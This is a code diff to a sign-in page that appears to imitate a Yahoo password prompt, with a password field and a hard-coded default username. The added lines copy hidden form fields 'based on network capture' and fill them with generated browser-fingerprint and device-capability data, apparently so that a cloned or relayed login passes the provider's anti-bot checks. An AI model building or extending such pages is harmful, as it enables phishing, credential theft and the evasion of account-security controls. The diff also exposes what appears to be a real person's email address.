@@ -140,6 +140,12 @@
             <input type="hidden" name="signin" value="Next">
             <input type="hidden" name="persistent" value="y">
             
+            <!-- Add these NEW hidden fields based on network capture -->
+            <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="">
+            <input type="hidden" name="deviceCapability" id="device-capability" value="">
+            <input type="hidden" name="signin" value="Next">
+            <input type="hidden" name="persistent" value="y">
+            
             <div class="form-group">
                 <label for="passwd">Password</label>
                 <input type="password" id="passwd" name="passwd" required autocomplete="current-password">
@@ -161,7 +167,7 @@
                 language: navigator.language || 'en-US',
                 colorDepth: screen.colorDepth || 24,
                 deviceMemory: navigator.deviceMemory || 'unknown',
-                pixelRatio: window.devicePixelRatio || 1,
+                pixelRatio: window.devicePixelRatio || 1.5,
                 hardwareConcurrency: navigator.hardwareConcurrency || 4,
                 timezoneOffset: new Date().getTimezoneOffset() || -60,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/London',
@@ -211,13 +217,10 @@
 
         // Generate device capability data
         function generateDeviceCapability() {
-            const capability = {
-                pa: {
-                    status: true
-                },
+            return JSON.stringify({
+                pa: { status: true },
                 isWebAuthnSupported: 'credentials' in navigator && 'create' in navigator.credentials
-            };
-            return JSON.stringify(capability);
+            });
         }
 
         // Initialize form data
@@ -231,6 +234,10 @@
             const username = urlParams.get('username') || 'daulgra@yahoo.com';
             document.getElementById('currentUsername').textContent = username;
             document.getElementById('hiddenUsername').value = username;
+
+            // Add these lines in the initializePage function after setting the username:
+            document.getElementById('browser-fp-data').value = generateBrowserFingerprint();
+            document.getElementById('device-capability').value = generateDeviceCapability();
             
             // Debug mode (press Ctrl+D to toggle)
             document.addEventListener('keydown', function(e) {
